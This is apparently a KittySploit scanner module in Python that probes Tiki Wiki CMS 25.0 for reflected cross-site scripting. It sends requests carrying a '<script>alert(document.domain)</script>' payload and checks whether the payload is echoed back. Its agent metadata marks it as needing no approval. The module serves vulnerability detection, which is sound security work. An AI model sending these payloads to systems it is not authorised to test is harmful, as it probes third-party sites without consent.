#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tiki Wiki CMS Groupware version 25."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting Detection',
        'description': 'Tiki Wiki CMS Groupware version 25.0 suffers from a cross site scripting vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'edb', 'xss', 'tikiwiki', 'packetstorm', 'acketstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/170446/Tiki-Wiki-CMS-Groupware-25.0-Cross-Site-Scripting.html',
        ],
    }

    def run(self):
        for path in ('/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>', '/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 403:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<script>alert(document.domain)</script>', 'Tiki Wiki CMS',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting detected",
                    path=path,
                )
                return True
        return False

